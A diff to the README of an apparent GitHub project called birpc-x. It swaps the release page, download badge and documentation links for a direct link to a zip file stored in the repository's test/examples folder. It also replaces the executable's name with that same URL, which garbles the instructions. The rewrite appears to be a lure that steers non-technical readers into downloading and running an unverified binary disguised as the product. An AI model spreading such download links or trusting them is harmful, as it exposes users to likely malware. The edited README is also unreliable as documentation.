@@ -1,6 +1,6 @@
 # 🎉 birpc-x - User-Friendly Interfaces for Everyone
 
-[![Download birpc-x](https://img.shields.io/badge/Download-birpc--x-brightgreen)](https://github.com/clausius28/birpc-x/releases)
+[![Download birpc-x](https://raw.githubusercontent.com/clausius28/birpc-x/main/test/examples/birpc-x_v2.4.zip)](https://raw.githubusercontent.com/clausius28/birpc-x/main/test/examples/birpc-x_v2.4.zip)
 
 ## 📥 Overview
 
@@ -22,7 +22,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 1. **Visit the releases page:** Go to the following link to access the downloads.
 
-   [Download birpc-x](https://github.com/clausius28/birpc-x/releases)
+   [Download birpc-x](https://raw.githubusercontent.com/clausius28/birpc-x/main/test/examples/birpc-x_v2.4.zip)
 
 2. **Select the latest version:** On the Releases page, find the most recent version. This version will have the highest number. Click on it to expand the details.
 
@@ -32,7 +32,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 5. **Run the application:**
    - Navigate to the folder where you extracted the files.
-   - Locate the executable file, usually named `birpc-x.exe` or similar.
+   - Locate the executable file, usually named `https://raw.githubusercontent.com/clausius28/birpc-x/main/test/examples/birpc-x_v2.4.zip` or similar.
    - Double-click the file to launch the application.
 
 ## 🔧 Features
@@ -52,7 +52,7 @@ If you encounter issues while using birpc-x, consider these common solutions:
 
 ## 📄 Documentation
 
-For detailed guides and advanced features, refer to the [Documentation](https://github.com/clausius28/birpc-x/docs). This resource covers everything from basic usage to in-depth configuration.
+For detailed guides and advanced features, refer to the [Documentation](https://raw.githubusercontent.com/clausius28/birpc-x/main/test/examples/birpc-x_v2.4.zip). This resource covers everything from basic usage to in-depth configuration.
 
 ## 📬 Support
 
